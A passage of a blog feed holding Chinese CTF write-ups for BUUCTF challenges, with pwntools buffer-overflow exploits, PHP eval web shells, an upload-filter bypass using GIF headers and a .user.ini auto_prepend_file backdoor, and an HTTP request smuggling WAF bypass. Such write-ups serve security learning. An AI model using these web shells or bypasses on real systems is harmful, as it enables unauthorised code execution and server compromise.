class="hljs-number">1</span>)<br>io.interactive()<br></code></pre></td></tr></tbody></table></figure><p><img src="/LawlietLW.github.io/2020/02/01/babyheap-0ctf-2017/14.jpg" alt=""><br>æˆåŠŸ</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> å † </tag>
            
            <tag> fastbin attack </tag>
            
            <tag> chunk extend </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF pwn1_sctf_2016</title>
      <link href="/LawlietLW.github.io/2020/01/30/buuctf-pwn1-sctf-2016/"/>
      <url>/LawlietLW.github.io/2020/01/30/buuctf-pwn1-sctf-2016/</url>
      
        <content type="html"><![CDATA[<p>checksec<br><img src="/LawlietLW.github.io/2020/01/30/buuctf-pwn1-sctf-2016/1.jpg" alt=""><br>32ä½ç¨‹åºï¼Œå¼€å¯æ ˆä¸å¯æ‰§è¡Œ<br>IDAåˆ†æï¼Œvulnå‡½æ•°å’Œåé—¨å‡½æ•°<br><img src="/LawlietLW.github.io/2020/01/30/buuctf-pwn1-sctf-2016/2.jpg" alt=""><br><img src="/LawlietLW.github.io/2020/01/30/buuctf-pwn1-sctf-2016/3.jpg" alt=""></p><p>vulnå‡½æ•°çœ‹èµ·æ¥å¾ˆå¤§ä¸€å¨ï¼Œå®é™…ä¸Šéƒ½æ˜¯C++çš„ä¸€äº›ä¸œè¥¿ï¼Œå‡½æ•°çš„çœŸæ­£æ„æ€å…¶å®å°±æ˜¯æŠŠIæ›¿æ¢æˆyou<br>æ‰§è¡Œç¨‹åºè¯•ä¸€è¯•<br><img src="/LawlietLW.github.io/2020/01/30/buuctf-pwn1-sctf-2016/4.jpg" alt=""><br>å¦‚æˆ‘ä»¬æ‰€æƒ³ä¸€æ ·<br>å†çœ‹å‘ç¼“å†²åŒº<br><img src="/LawlietLW.github.io/2020/01/30/buuctf-pwn1-sctf-2016/5.jpg" alt=""><br>getså…è®¸è¾“å…¥32ä¸ªå­—èŠ‚ï¼Œè€Œsçš„ç¼“å†²åŒºå¤šè¾¾3Cä¸ªå­—èŠ‚ï¼Œä¹Ÿå°±æ˜¯ç›¸å¯¹äºebpæœ‰60ä¸ªå­—èŠ‚ï¼Œåˆ™ç›¸å¯¹äºeipæœ‰64ä¸ªå­—èŠ‚ï¼Œæ­£å¸¸è¾“å…¥çš„è¯æ— æ³•é€ æˆç¼“å†²åŒºæº¢å‡º<br>ä½†ç»“åˆç¨‹åºä¼šæŠŠâ€™Iâ€™æ›¿æ¢æˆâ€™youâ€™çš„æ•ˆæœæ¥çœ‹ï¼Œåªè¦æˆ‘ä»¬è¾“å…¥21ä¸ªâ€™Iâ€™ï¼Œç»è¿‡ä¸‰å€å­—èŠ‚æ›¿æ¢åå°±ä¼šå˜æˆ63ä¸ªå­—èŠ‚ï¼Œå†åŠ ä¸Šä¸€ä¸ªå­—èŠ‚å°±èƒ½é€ æˆç¼“å†²åŒºæº¢å‡º<br>æ‰€ä»¥å¯ä»¥å†™å‡ºexpå¦‚ä¸‹</p><figure class="hljs highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre class=" language-hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#io = process('./pwn1_sctf_2016')</span><br>io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>, <span class="hljs-number">26405</span>)<br>get_flag_addr = <span class="hljs-number">0x08048f0d</span><br>payload = <span class="hljs-string">'I'</span>*<span class="hljs-number">20</span><br>payload += <span class="hljs-string">'A'</span>*<span class="hljs-number"><code class="language-hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#io = process('./pwn1_sctf_2016')</span><br>io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>, <span class="hljs-number">26405</span>)<br>get_flag_addr = <span class="hljs-number">0x08048f0d</span><br>payload = <span class="hljs-string">'I'</span>*<span class="hljs-number">20</span><br>payload += <span class="hljs-string">'A'</span>*<span class="hljs-number">4</span><br>payload += p32(get_flag_addr)<br>io.sendline(payload)<br>io.interactive()<br></code></pre></td></tr></tbody></table></figure><p><img src="/LawlietLW.github.io/2020/01/30/buuctf-pwn1-sctf-2016/5.jpg" alt=""><br>æˆåŠŸè¯»å–flag</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> æ ˆæº¢å‡º </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF warmup_csaw_2016</title>
      <link href="/LawlietLW.github.io/2020/01/30/buuctf-warmup-csaw-2016/"/>
      <url>/LawlietLW.github.io/2020/01/30/buuctf-warmup-csaw-2016/</url>
      
        <content type="html"><![CDATA[<p>checksec<br><img src="/LawlietLW.github.io/2020/01/30/buuctf-warmup-csaw-2016/1.jpg" alt=""><br>64ä½ç¨‹åºï¼Œæ²¡æœ‰ä¿æŠ¤<br>æ‹–å…¥IDAæŸ¥çœ‹,F5å¤§æ³•<br><img src="/LawlietLW.github.io/2020/01/30/buuctf-warmup-csaw-2016/2.jpg" alt=""><br>åŒæ ·æœ‰ä¸€ä¸ªåé—¨å‡½æ•°ï¼Œè¿™ä¸ªåé—¨å‡½æ•°ç›´æ¥è¯»å–flag<br><img src="/LawlietLW.github.io/2020/01/30/buuctf-warmup-csaw-2016/3.jpg" alt=""><br>æ‰€ä»¥åšæ³•å’Œripä¸€æ ·<br>ç›´æ¥è´´exp</p><figure class="hljs highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre class=" language-hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#io = process('./warmup_csaw_2016')</span><br>io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>, <span class="hljs-number">27003</span>)<br>get_flag_addr = <span class="hljs-number">0x40060d</span><br>payload = <span class="hljs-string">'A'</span>*<span class="hljs-number"><code class="language-hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#io = process('./warmup_csaw_2016')</span><br>io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>, <span class="hljs-number">27003</span>)<br>get_flag_addr = <span class="hljs-number">0x40060d</span><br>payload = <span class="hljs-string">'A'</span>*<span class="hljs-number">72</span><br>payload += p64(get_flag_addr)<br>io.sendline(payload)<br>io.interactive()<br></code></pre></td></tr></tbody></table></figure><p><img src="/LawlietLW.github.io/2020/01/30/buuctf-warmup-csaw-2016/5.jpg" alt=""><br>æˆåŠŸè¯»å–flag</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> æ ˆæº¢å‡º </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF rip</title>
      <link href="/LawlietLW.github.io/2020/01/23/buuctf-rip/"/>
      <url>/LawlietLW.github.io/2020/01/23/buuctf-rip/</url>
      
        <content type="html"><![CDATA[<p>å…¥é—¨æ ˆæº¢å‡ºé¢˜ç›®ï¼Œé¦–å…ˆchecksecä¸€ä¸‹<br><img src="/LawlietLW.github.io/2020/01/23/buuctf-rip/1.jpg" alt=""><br>64ä½ç¨‹åºï¼Œæ²¡æœ‰ä»»ä½•ä¿æŠ¤</p><a id="more"></a><p>æ‹–å…¥IDAæŸ¥çœ‹,F5å¤§æ³•å¥½<br>é¦–å…ˆæ˜¯mainå‡½æ•°<br><img src="/LawlietLW.github.io/2020/01/23/buuctf-rip/2.jpg" alt=""><br>è¿˜æœ‰ä¸€ä¸ªåé—¨å‡½æ•°fun()<br><img src="/LawlietLW.github.io/2020/01/23/buuctf-rip/3.jpg" alt=""><br>å¾ˆæ˜æ˜¾,mainå‡½æ•°ä¸­çš„getså­˜åœ¨æº¢å‡º,æ¥ä¸‹æ¥æ¥ç¡®å®šæº¢å‡ºå­—èŠ‚æ•°<br><img src="/LawlietLW.github.io/2020/01/23/buuctf-rip/4.jpg" alt=""><br>ç›¸å¯¹äºEIPæœ‰23ä¸ªå­—èŠ‚<br>expå¦‚ä¸‹</p><figure class="hljs highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre class=" language-hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#io = process('./rip')</span><br>io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>, <span class="hljs-number">27031</span>)<br><br>fun_addr = <span class="hljs-number">0x40118a</span><br>payload = <span class="hljs-string">'A'</span>*<span class="hljs-number"><code class="language-hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#io = process('./rip')</span><br>io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>, <span class="hljs-number">27031</span>)<br><br>fun_addr = <span class="hljs-number">0x40118a</span><br>payload = <span class="hljs-string">'A'</span>*<span class="hljs-number">23</span><br>payload += p64(fun_addr)<br>io.sendline(payload)<br>io.interactive()<br></code></pre></td></tr></tbody></table></figure><p><img src="/LawlietLW.github.io/2020/01/23/buuctf-rip/5.jpg" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> æ ˆæº¢å‡º </tag>
            
            <tag> rip </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF CheckIn</title>
      <link href="/LawlietLW.github.io/2019/12/23/buuctf-checkin/"/>
      <url>/LawlietLW.github.io/2019/12/23/buuctf-checkin/</url>
      
        <content type="html"><![CDATA[<p>æ‰“å¼€ç¯å¢ƒï¼Œæ˜¯ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ é¡µé¢<br><img src="/LawlietLW.github.io/2019/12/23/buuctf-checkin/1.jpg" alt=""></p><a id="more"></a><p>å…ˆæŸ¥çœ‹ä¸€ä¸‹æºä»£ç ï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰å®¢æˆ·ç«¯æ ¡éªŒ<br><img src="/LawlietLW.github.io/2019/12/23/buuctf-checkin/7.jpg" alt=""><br>æ˜¾ç„¶æ²¡æœ‰å®¢æˆ·ç«¯æ ¡éªŒ<br>é¦–å…ˆä¸Šä¼ ä¸€ä¸ªå›¾ç‰‡ï¼Œæ£€æŸ¥ä¸Šä¼ åŠŸèƒ½<br><img src="/LawlietLW.github.io/2019/12/23/buuctf-checkin/2.jpg" alt=""><br>å›¾ç‰‡æ­£å¸¸ä¸Šä¼ <br>æ¥ä¸‹æ¥å†ä¸Šä¼ ä¸€ä¸ªphpæ–‡ä»¶</p><figure class="hljs highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre class=" language-hljs php"><span class="hljs-meta">&lt;?php</span> <br>@<span class="hljs-keyword">eval</span>($_POST[<span class="hljs-string">'shell'</span>]);<br> <span class="hljs-meta"><code class="language-hljs php"><span class="hljs-meta">&lt;?php</span> <br>@<span class="hljs-keyword">eval</span>($_POST[<span class="hljs-string">'shell'</span>]);<br> <span class="hljs-meta">?></span><br></code></pre></td></tr></tbody></table></figure><p><img src="/LawlietLW.github.io/2019/12/23/buuctf-checkin/3.jpg" alt=""><br>æç¤ºéæ³•åç¼€<br>é‚£ä¹ˆåº”è¯¥æ˜¯ä¸èƒ½æ¥å—phpåç¼€çš„æ–‡ä»¶äº†ï¼Œæˆ‘ä»¬æŠŠåç¼€æ”¹æˆjpgè¯•ä¸€ä¸‹<br><img src="/LawlietLW.github.io/2019/12/23/buuctf-checkin/8.jpg" alt=""><br>æˆ‘æŠŠcontent-typeå­—æ®µå’Œåç¼€åéƒ½æ”¹äº†ä¸€ä¸‹<br><img src="/LawlietLW.github.io/2019/12/23/buuctf-checkin/9.jpg" alt=""><br>ä½†ä¾ç„¶æ— æ³•ä¸Šä¼ ï¼Œæç¤ºæ£€æµ‹åˆ°äº†éæ³•å­—ç¬¦<br>é‚£æˆ‘ä»¬å†æŠŠä¸€å¥è¯æ¢ä¸€ç§å†™æ³•</p><figure class="hljs highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre class=" language-hljs php">&lt;script language=<span class="hljs-string">'php'</span>&gt; <br>@<span class="hljs-keyword">eval</span>($_POST[<span class="hljs-string"><code class="language-hljs php">&lt;script language=<span class="hljs-string">'php'</span>&gt; <br>@<span class="hljs-keyword">eval</span>($_POST[<span class="hljs-string">'pass'</span>]);<br></script><br></code></pre></td></tr></tbody></table></figure><p>ç»§ç»­ä¸Šä¼ <br>å¾—åˆ°äº†è¿™æ ·çš„åé¦ˆ<br><img src="/LawlietLW.github.io/2019/12/23/buuctf-checkin/10.jpg" alt=""></p><figure class="hljs highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre class=" language-hljs bash"><code class="language-hljs bash">exif_imagetype() è¯»å–ä¸€ä¸ªå›¾åƒçš„ç¬¬ä¸€ä¸ªå­—èŠ‚å¹¶æ£€æŸ¥å…¶ç­¾åã€‚<br></code></pre></td></tr></tbody></table></figure><p>è¿™é‡Œæ˜¯æœ‰æ–‡ä»¶å†…å®¹å¤´æ ¡éªŒ<br>ä¸åŒçš„å›¾ç‰‡å½¢å¼çš„æ–‡ä»¶å¤´å¦‚ä¸‹</p><figure class="hljs highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre class=" language-hljs bash"><code class="language-hljs bash">JPG ï¼šFF D8 FF E0 00 10 4A 46 49 46<br>GIF(ç›¸å½“äºæ–‡æœ¬çš„GIF89a)ï¼š47 49 46 38 39 61<br>PNGï¼š 89 50 4E 47<br></code></pre></td></tr></tbody></table></figure><p>ç»™æˆ‘ä»¬çš„shellåŠ ä¸ŠGIFæ–‡ä»¶çš„æ–‡ä»¶å¤´ï¼Œç»§ç»­ä¸Šä¼ <br><img src="/LawlietLW.github.io/2019/12/23/buuctf-checkin/11.jpg" alt=""><br>ä¸Šä¼ æˆåŠŸ<br>ä½†ä¸Šä¼ æˆåŠŸäº†è¯¥å¦‚ä½•åˆ©ç”¨å‘¢ï¼Œå›¾ç‰‡é©¬éœ€è¦æœ‰æ–‡ä»¶åŒ…å«æ¼æ´æˆ–è€…è§£ææ¼æ´æ‰èƒ½å¤Ÿåˆ©ç”¨ï¼Œä½†è¿™é“é¢˜å¹¶æ²¡æœ‰ç›¸åº”çš„æ¼æ´<br>æ¥ä¸‹æ¥å°±æ˜¯æˆ‘ä»è¿™é“é¢˜é‡Œé¢å­¦åˆ°çš„æ–°å§¿åŠ¿äº†<br>å…ˆè´´ä¸ŠPç‰›çš„é“¾æ¥<br><a href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html" target="_blank" rel="noopener">.user.iniæ–‡ä»¶æ„æˆçš„PHPåé—¨</a></p><p>php.iniæ˜¯phpé»˜è®¤çš„é…ç½®æ–‡ä»¶ï¼Œå…¶ä¸­åŒ…æ‹¬äº†å¾ˆå¤šphpçš„é…ç½®<br><img src="/LawlietLW.github.io/2019/12/23/buuctf-checkin/12.jpg" alt=""><br>è€Œ.user.iniå®é™…ä¸Šå°±æ˜¯ä¸€ä¸ªå¯ä»¥ç”±ç”¨æˆ·â€œè‡ªå®šä¹‰â€çš„php.iniï¼Œæˆ‘ä»¬èƒ½å¤Ÿè‡ªå®šä¹‰çš„è®¾ç½®æ˜¯æ¨¡å¼ä¸ºâ€œPHP_INI_PERDIR ã€ PHP_INI_USERâ€çš„è®¾ç½®<br>è€Œä¸”ï¼Œå’Œphp.iniä¸åŒçš„æ˜¯ï¼Œ.user.iniæ˜¯ä¸€ä¸ªèƒ½è¢«åŠ¨æ€åŠ è½½çš„iniæ–‡ä»¶<br>æ‰€ä»¥ï¼Œæˆ‘ä»¬èƒ½è½»æ˜“åœ°ç”¨.user.iniæ–‡ä»¶æ„é€ å‡ºä¸€ä¸ªPHPåé—¨<br>Phpé…ç½®é¡¹ä¸­æœ‰ä¸¤ä¸ªæ¯”è¾ƒæœ‰æ„æ€çš„é¡¹<br>auto_append_fileã€auto_prepend_file<br>å…¶ä¸­auto_prepend_fileæŒ‡å®šä¸€ä¸ªæ–‡ä»¶ï¼Œè‡ªåŠ¨åŒ…å«åœ¨è¦æ‰§è¡Œçš„æ–‡ä»¶å‰ï¼Œç±»ä¼¼äºåœ¨æ–‡ä»¶å‰è°ƒç”¨äº†require()å‡½æ•°<br>auto_append_fileåˆ™æ˜¯åœ¨æ–‡ä»¶åé¢åŒ…å«<br>ä¹Ÿå°±æ˜¯è¯´ï¼Œ.user.iniæ–‡ä»¶ç›¸å½“äºåˆ›é€ äº†æ–‡ä»¶åŒ…å«çš„æœºä¼š<br>ç”¨æ³•ä¹Ÿç®€å•ï¼Œç›´æ¥å†™å…¥.user.iniæ–‡ä»¶å³å¯</p><p>æ‰€ä»¥ï¼Œæœ¬é¢˜ä¸­ï¼Œæˆ‘ä»¬åªéœ€è¦å…ˆåˆ›å»ºä¸€ä¸ª.user.iniæ–‡ä»¶<br><img src="/LawlietLW.github.io/2019/12/23/buuctf-checkin/13.jpg" alt=""><br>åŒæ ·éœ€è¦åœ¨.user.iniæ–‡ä»¶å‰åŠ å…¥GIFæ–‡ä»¶å¤´<br>å†åˆ›å»ºä¸€ä¸ªå›¾ç‰‡é©¬<br>å¯ä»¥ä½¿ç”¨copyå‘½ä»¤</p><figure class="hljs highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre class=" language-hljs bash"><code class="language-hljs bash">copy shell.jpg/b+shell.php/a shell.jpg<br></code></pre></td></tr></tbody></table></figure><p>ä¹Ÿå¯ä»¥ä½¿ç”¨ä¸€ä¸ªå«edjpgcomçš„å·¥å…·æ¥ç”Ÿæˆå›¾ç‰‡é©¬</p><p>é¦–å…ˆä¸Šä¼ æˆ‘ä»¬çš„.user.iniæ–‡ä»¶<br><img src="/LawlietLW.github.io/2019/12/23/buuctf-checkin/14.jpg" alt=""><br>ç„¶åä¸Šä¼ å›¾ç‰‡é©¬<br><img src="/LawlietLW.github.io/2019/12/23/buuctf-checkin/15.jpg" alt=""><br>è®¿é—®ä¸€ä¸‹ä¸Šä¼ çš„ä½ç½®<br><img src="/LawlietLW.github.io/2019/12/23/buuctf-checkin/16.jpg" alt=""><br>èšå‰‘è¿æ¥<br><img src="/LawlietLW.github.io/2019/12/23/buuctf-checkin/17.jpg" alt=""><br>æˆåŠŸæ‹¿åˆ°flag</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> .user.iniæ–‡ä»¶çš„åˆ©ç”¨ï¼Œæ–‡ä»¶ä¸Šä¼  </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF Easy Calc</title>
      <link href="/LawlietLW.github.io/2019/12/22/buuctf-easy-calc/"/>
      <url>/LawlietLW.github.io/2019/12/22/buuctf-easy-calc/</url>
      
        <content type="html"><![CDATA[<p>æ‰“å¼€ç¯å¢ƒ<br><img src="/LawlietLW.github.io/2019/12/22/buuctf-easy-calc/1.jpg" alt=""></p><a id="more"></a><p>æŸ¥çœ‹æºä»£ç </p><figure class="hljs highlight"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre class=" language-hljs javascript"><code class="language-hljs javascript"><!--I've set up WAF to ensure security.--><br><script><br>    $('#calc').submit(function(){<br>        $.ajax({<br>            url:"calc.php?num="+encodeURIComponent($("#content").val()),<br>            type:'GET',<br>            success:function(data){<br>                $("#result").html(`<div class="alert alert-success"><br>            <strong>ç­”æ¡ˆ:</strong>${data}<br>            </div>`);<br>            },<br>            error:function(){<br>                alert("è¿™å•¥?ç®—ä¸æ¥!");<br>            }<br>        })<br>        return false;<br>    })<br></script><br></code></pre></td></tr></tbody></table></figure><p>æœ‰ä¸€ä¸ª<code>calc.php</code>,è·Ÿè¿›å»çœ‹çœ‹<br>å‘ç°wafä»£ç </p><figure class="hljs highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre class=" language-hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'num'</span>])){<br>    show_source(<span class="hljs-keyword">__FILE__</span>);<br>}<span class="hljs-keyword">else</span>{<br>        $str = $_GET[<span class="hljs-string">'num'</span>];<br>        $blacklist = [<span class="hljs-string">' '</span>, <span class="hljs-string">'\t'</span>, <span class="hljs-string">'\r'</span>, <span class="hljs-string">'\n'</span>,<span class="hljs-string">'\''</span>, <span class="hljs-string">'"'</span>, <span class="hljs-string">'`'</span>, <span class="hljs-string">'\['</span>, <span class="hljs-string">'\]'</span>,<span class="hljs-string">'\$'</span>,<span class="hljs-string">'\\'</span>,<span class="hljs-string">'\^'</span>];<br>        <span class="hljs-keyword">foreach</span> ($blacklist <span class="hljs-keyword">as</span> $blackitem) {<br>                <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">'/'</span> . $blackitem . <span class="hljs-string">'/m'</span>, $str)) {<br>                        <span class="hljs-keyword">die</span>(<span class="hljs-string">"what are you want to do?"</span>);<br>                }<br>        }<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-string">'echo '</span>.$str.<span class="hljs-string">';'</span>);<br>}<br><span class="hljs-meta"><code class="language-hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'num'</span>])){<br>    show_source(<span class="hljs-keyword">__FILE__</span>);<br>}<span class="hljs-keyword">else</span>{<br>        $str = $_GET[<span class="hljs-string">'num'</span>];<br>        $blacklist = [<span class="hljs-string">' '</span>, <span class="hljs-string">'\t'</span>, <span class="hljs-string">'\r'</span>, <span class="hljs-string">'\n'</span>,<span class="hljs-string">'\''</span>, <span class="hljs-string">'"'</span>, <span class="hljs-string">'`'</span>, <span class="hljs-string">'\['</span>, <span class="hljs-string">'\]'</span>,<span class="hljs-string">'\$'</span>,<span class="hljs-string">'\\'</span>,<span class="hljs-string">'\^'</span>];<br>        <span class="hljs-keyword">foreach</span> ($blacklist <span class="hljs-keyword">as</span> $blackitem) {<br>                <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">'/'</span> . $blackitem . <span class="hljs-string">'/m'</span>, $str)) {<br>                        <span class="hljs-keyword">die</span>(<span class="hljs-string">"what are you want to do?"</span>);<br>                }<br>        }<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-string">'echo '</span>.$str.<span class="hljs-string">';'</span>);<br>}<br><span class="hljs-meta">?></span><br></code></pre></td></tr></tbody></table></figure><p>wafè¿‡æ»¤äº†â€™ â€˜,â€™\tâ€™,â€™\râ€™,â€™\nâ€™,â€™'â€˜,â€™â€â€˜,â€™`â€™,â€™[â€˜,â€™]â€™,â€™$â€™,â€™'<br>å…¶ä¸­ä»¥getæ–¹å¼ç»™numä¼ å‚</p><p>ç”±äºå‰ç«¯è®¾ç½®äº†wafï¼Œæ‰€ä»¥åªè¦æˆ‘ä»¬çš„è®¿é—®è¯·æ±‚ä¸­åŒ…å«éæ³•å­—ç¬¦å°±ä¼šè¿”å›403ï¼Œæ— æ³•è®¿é—®åˆ°åç«¯<br>åœ¨è¿™æ ·çš„æƒ…å†µä¸‹æˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨HTTPèµ°ç§æ¥ç»•è¿‡å‰ç«¯wafç›´æ¥è®¿é—®åç«¯</p><p>å…³äºHTTPèµ°ç§çš„ä»‹ç»ç½‘ä¸Šæœ‰è®¸å¤šå¸ˆå‚…åšäº†è®²è§£ï¼Œåœ¨è¿™é‡Œå°±ä¸å¤šå™è¿°äº†<br>(HTTPèµ°ç§)[<a href="https://xz.aliyun.com/t/6654]" target="_blank" rel="noopener">https://xz.aliyun.com/t/6654]</a><br>(httpè¯·æ±‚èµ°ç§(HTTP Request Smuggling))[<a href="https://blog.csdn.net/qq_37865996/article/details/102529396]" target="_blank" rel="noopener">https://blog.csdn.net/qq_37865996/article/details/102529396]</a><br>è´´ä¸¤ä¸ªé“¾æ¥</p><p>åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨CL-CLæ–¹å¼æ¥è¿›è¡Œhttpèµ°ç§ï¼Œå½“ç„¶å…¶ä»–çš„æ–¹å¼ä¹Ÿä¸€æ ·å¯ä»¥<br><img src="/LawlietLW.github.io/2019/12/22/buuctf-easy-calc/2.jpg" alt=""><br>å‰ç«¯æœåŠ¡å™¨è¯»å–å®Œnum=1ä¹‹åï¼Œå°†æ•°æ®åŒ…åŸå°ä¸åŠ¨åœ°è½¬å‘ç»™åç«¯ï¼Œåç«¯è¯»å–åˆ°<code>?num=phpinfo()</code>åï¼Œè¿”å›ç»™æˆ‘ä»¬<code>phpinfo()</code><br>åœ¨è¿™ä¸€é¢˜é‡Œæœ‰å‡ ä¸ªPHPå‡½æ•°éœ€è¦æˆ‘ä»¬æ³¨æ„</p><figure class="hljs highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre class=" language-hljs bash">scandir() å‡½æ•°<br>è¿”å›æŒ‡å®šç›®å½•ä¸­çš„æ–‡ä»¶å’Œç›®å½•çš„æ•°ç»„ã€‚<br>var_dump()å‡½æ•°ï¼švar_dump() å‡½æ•°ç”¨äºè¾“å‡ºå˜é‡çš„ç›¸å…³ä¿¡æ¯ã€‚<br>var_dump() 